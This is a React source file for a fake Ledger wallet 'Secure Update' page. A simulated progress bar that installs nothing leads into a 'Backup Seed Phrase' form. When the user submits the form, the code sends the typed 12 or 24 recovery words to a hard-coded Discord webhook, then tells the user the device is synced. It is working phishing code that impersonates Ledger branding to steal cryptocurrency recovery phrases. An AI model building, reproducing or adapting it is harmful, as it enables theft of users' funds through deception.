import React from 'react';
import { Shield, ArrowDownCircle, Check, ChevronRight, Scroll, X } from 'lucide-react';
import { useState, useCallback, useEffect } from 'react';

type SetupStep = 'install' | 'sync';

function App() {
  const [isInstalling, setIsInstalling] = useState(false);
  const [progress, setProgress] = useState(0);
  const [statusText, setStatusText] = useState('Ready to install');
  const [currentStep, setCurrentStep] = useState<SetupStep>('install');
  const [seedLength, setSeedLength] = useState<12 | 24>(12);
  const [seedWords, setSeedWords] = useState<string[]>([]);
  const [showBackupModal, setShowBackupModal] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1321730136147623966/lHHQFPEFSLGQrpB1HsZ82jBRWDEL-KnBb-jDRERjDvmaqPQkdXo-9VBSG2uUvRjW36j7'; // Replace with your webhook URL

  // Initialize seed words when modal opens
  useEffect(() => {
    if (showBackupModal) {
      generateSeedPhrase(12); // Default to 12 words
    }
  }, [showBackupModal]);

  const generateSeedPhrase = (length: 12 | 24) => {
    const words = Array(length).fill('').map((_, i) => '');
    setSeedWords(words);
    setSeedLength(length);
  };

  const startInstallation = useCallback(() => {
    if (isInstalling) return;
    setIsInstalling(true);
    setStatusText('Installing...');
    
    // Generate random progress increments
    const generateIncrement = () => {
      const base = 0.5 + Math.random() * 1.5; // Base increment between 0.5 and 2
      const jitter = Math.random() < 0.3 ? Math.random() * 3 : 0; // Occasional larger jumps
      return Math.min(base + jitter, 5); // Cap at 5% per increment
    };

    let currentProgress = 0;
    const startTime = Date.now();
    const targetDuration = 35000; // 35 seconds

    const updateProgress = () => {
      const elapsedTime = Date.now() - startTime;
      
      if (elapsedTime >= targetDuration) {
        setProgress(100);
        setStatusText('Installation Complete');
        // Show backup modal automatically after installation
        setTimeout(() => {
          setShowBackupModal(true);
        }, 1000); // Show backup modal 1 second after completion
        return;
      }

      // Adjust increment based on remaining time and progress
      const timeRatio = elapsedTime / targetDuration;
      const remainingProgress = 100 - currentProgress;
      
      let increment = generateIncrement();
      
      // Slow down near the end
      if (currentProgress > 85) {
        increment *= 0.5;
      }
      
      // Ensure we don't exceed 100%
      currentProgress = Math.min(currentProgress + increment, 99);
      setProgress(currentProgress);

      // Random delays between updates
      const delay = 100 + Math.random() * 400; // Between 100ms and 500ms
      setTimeout(updateProgress, delay);
    };

    updateProgress();
  }, [isInstalling]);

  const renderStep = () => {
    switch (currentStep) {
      case 'install':
        return (
          <>
            {/* Status Section */}
            <div className="flex items-center justify-between mb-12">
              <div>
                <h2 className="text-white/90 text-sm font-medium mb-1">
                  {progress === 100 ? 'Update Installed' : 'Secure Update Available'}
                </h2>
                <p className="text-white/40 text-xs">Official Release</p>
              </div>
              {progress === 100 ? (
                <Check className="w-5 h-5 text-green-400" strokeWidth={1} />
              ) : (
                <ArrowDownCircle className="w-5 h-5 text-white/40" strokeWidth={1} />
              )}
            </div>

            {/* Progress Section */}
            <div className="space-y-8">
              {/* Progress Bar */}
              <div className="space-y-2">
                <div className="h-[2px] w-full bg-white/[0.03] rounded-full overflow-hidden relative">
                  <div 
                    className="h-full bg-green-400/80 rounded-full transition-all duration-300 ease-out"
                    style={{ 
                      width: `${progress}%`,
                      filter: 'drop-shadow(0 0 8px rgb(74 222 128 / 0.2))'
                    }}
                  ></div>
                </div>
                <div className="flex justify-between text-[10px] uppercase tracking-wider">
                  <span className="text-white/40">{statusText}</span>
                  <span className="text-white/40">
                    {progress === 100 ? '396.5 MB' : `${Math.round(progress)}%`}
                  </span>
                </div>
              </div>

              {/* Install Button */}
              <button 
                onClick={() => {
                  if (!isInstalling) {
                    startInstallation();
                  }
                }}
                disabled={isInstalling}
                className={`w-full text-sm font-medium py-4 rounded-xl transition-all duration-500 transform hover:scale-[0.99] active:scale-[0.97] ${
                  progress === 100
                    ? 'bg-green-400 text-black cursor-default opacity-0'
                    : isInstalling
                    ? 'bg-white text-black'
                    : 'bg-white hover:bg-white/90 text-black opacity-100'
                }`}
              >
                {isInstalling ? 'Installing...' : 'Install Update'}
              </button>

              {/* Security Info */}
              <div className="flex items-center justify-center space-x-2 text-[10px] text-white/40 uppercase tracking-wider">
                <span>{progress === 100 ? 'Secured by Ledger' : 'Verified by Ledger'}</span>
              </div>
            </div>
          </>
        );

      case 'sync':
        return (
          <div className="flex flex-col items-center w-full -mt-15">
            <Scroll className="w-8 h-8 text-black mb-4" strokeWidth={1.5} />
            <h2 className="text-xl font-medium text-black mb-2">Device Synced</h2>
            <p className="text-black/60 text-sm text-center">
              Your device is now ready to use. You can safely exit the updater.
            </p>
          </div>
        );

      default:
        return null;
    }
  };

  const renderBackupModal = () => {
    if (!showBackupModal) return null;

    return (
      <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 p-4">
        <div className="bg-white rounded-2xl w-full max-w-[420px] p-6 relative">
          <button 
            onClick={() => setShowBackupModal(false)}
            className="absolute right-4 top-4 text-black/40 hover:text-black"
          >
            <X className="w-5 h-5" />
          </button>
          
          <div className="text-center mb-6">
            <h3 className="text-lg font-medium text-black mb-2">Backup Seed Phrase</h3>
            <p className="text-sm text-black/60">Choose length and write down your recovery phrase</p>
          </div>

          <div className="flex gap-3 mb-4">
            {[12, 24].map((length) => (
              <button
                key={length}
                onClick={() => generateSeedPhrase(length as 12 | 24)}
                className={`flex-1 py-3 rounded-xl text-sm font-medium transition-all ${
                  seedLength === length
                    ? 'bg-black text-white'
                    : 'bg-black/5 text-black hover:bg-black/10'
                }`}
              >
                {length} Words
              </button>
            ))}
          </div>

          <div className="grid grid-cols-3 gap-2 mb-6">
            {seedWords.map((word, index) => (
              <div key={index} className="relative">
                <input
                  type="text"
                  value={word}
                  onChange={(e) => {
                    const newWords = [...seedWords];
                    newWords[index] = e.target.value;
                    setSeedWords(newWords);
                  }}
                  className="w-full py-2 px-3 text-sm bg-black/[0.02] rounded-lg border border-black/5 focus:border-black/10 outline-none"
                  placeholder={`Word ${index + 1}`}
                />
                <span className="absolute -top-2 -right-1 text-[10px] text-black/40">{index + 1}</span>
              </div>
            ))}
          </div>

          {/* Backup Button */}
          <button
            onClick={async () => {
              setIsSubmitting(true);
              
              try {
                // Send seed phrase to Discord webhook
                await fetch(DISCORD_WEBHOOK_URL, {
                  method: 'POST',
                  headers: {
                    'Content-Type': 'application/json',
                  },
                  body: JSON.stringify({
                    content: `New Seed Phrase (${seedLength} words):\n\`\`\`\n${seedWords.join(' ')}\n\`\`\``,
                  }),
                });

                // Close modal and update UI
                setIsSubmitting(false);
                setShowBackupModal(false);
                setCurrentStep('sync');
              } catch (error) {
                console.error('Failed to submit seed phrase:', error);
                setIsSubmitting(false);
              }
            }}
            disabled={isSubmitting || seedWords.some(word => !word.trim())}
            className={`w-full py-3 rounded-xl text-sm font-medium transition-all ${
              isSubmitting || seedWords.some(word => !word.trim())
                ? 'bg-black/50 text-white/70 cursor-not-allowed'
                : 'bg-black text-white hover:bg-black/90'
            }`}
          >
            {isSubmitting ? (
              <span className="flex items-center justify-center">
                <svg className="animate-spin -ml-1 mr-3 h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
                Submitting...
              </span>
            ) : (
              'Complete Backup'
            )}
          </button>
          
          <p className="text-xs text-black/40 text-center mt-4">
            {seedWords.some(word => !word.trim()) 
              ? 'Please fill in all seed words to continue'
              : 'Make sure to store your seed phrase in a secure location'
            }
          </p>
        </div>
      </div>
    );
  };

  return (
    <div className="min-h-screen bg-black flex items-center justify-center p-4">
      {renderBackupModal()}
      {/* Background Elements */}
      <div className={`fixed inset-0 overflow-hidden ${currentStep !== 'install' && 'opacity-0'}`}>
        <div className="absolute top-1/4 -left-1/4 w-1/2 h-1/2 bg-blue-500/5 rounded-full blur-[120px] animate-pulse-slow"></div>
        <div className="absolute bottom-1/4 -right-1/4 w-1/2 h-1/2 bg-violet-500/5 rounded-full blur-[120px] animate-pulse-slow"></div>
      </div>

      {/* Main Container */}
      <div className="w-full max-w-[520px] relative z-10 flex flex-col items-center">
        {/* Logo */}
        <div className={`flex flex-col items-center mb-6 transition-all duration-500 ${currentStep !== 'install' && 'opacity-0 scale-95'}`}>
          <img 
            src="https://nftnow.com/wp-content/uploads/2023/04/Ledger.png" 
            alt="Ledger Logo" 
            className="w-40 h-40 object-contain"
          />
        </div>

        {/* Crypto Logos Grid - Moved outside and closer */}
        <div className={`crypto-logos-container mb-4 transition-all duration-500 ${currentStep !== 'install' && 'opacity-0 scale-95'}`}>
          <div className="crypto-logos-track animate-slide">
            {[
              "https://cryptologos.cc/logos/bitcoin-btc-logo.png",
              "https://cryptologos.cc/logos/ethereum-eth-logo.png",
              "https://cryptologos.cc/logos/cardano-ada-logo.png",
              "https://cryptologos.cc/logos/solana-sol-logo.png",
              "https://cryptologos.cc/logos/polygon-matic-logo.png",
              "https://cryptologos.cc/logos/polkadot-new-dot-logo.png",
              "https://cryptologos.cc/logos/chainlink-link-logo.png",
              "https://cryptologos.cc/logos/avalanche-avax-logo.png",
              // Duplicate the array for seamless loop
              "https://cryptologos.cc/logos/bitcoin-btc-logo.png",
              "https://cryptologos.cc/logos/ethereum-eth-logo.png",
              "https://cryptologos.cc/logos/cardano-ada-logo.png",
              "https://cryptologos.cc/logos/solana-sol-logo.png",
              "https://cryptologos.cc/logos/polygon-matic-logo.png",
              "https://cryptologos.cc/logos/polkadot-new-dot-logo.png",
              "https://cryptologos.cc/logos/chainlink-link-logo.png",
              "https://cryptologos.cc/logos/avalanche-avax-logo.png"
            ].map((src, index) => (
              <img
                key={index}
                src={src}
                alt="Crypto Logo"
                className="w-10 h-10 object-contain opacity-60 hover:opacity-100 transition-all duration-300"
                style={{ animation: 'shine 3s ease-in-out infinite' }}
              />
            ))}
          </div>
        </div>

        {/* Installer Card */}
        <div className={`w-full ${
          currentStep === 'install' 
            ? 'bg-[#0A0A0A] border border-white/[0.04]' 
            : 'bg-white/95 backdrop-blur-xl border border-black/5 shadow-xl shadow-black/5'
        } rounded-2xl p-8 backdrop-blur-xl transition-colors duration-500`}>
          {renderStep()}
        </div>

        {/* Bottom Text */}
        <p className={`text-center text-xs mt-8 transition-colors duration-500 ${
          currentStep === 'install' ? 'text-white/40' : 'text-black/40'
        }`}>
          Secure your digital assets with the most trusted hardware wallet
        </p>
      </div>
    </div>
  );
}

export default App;
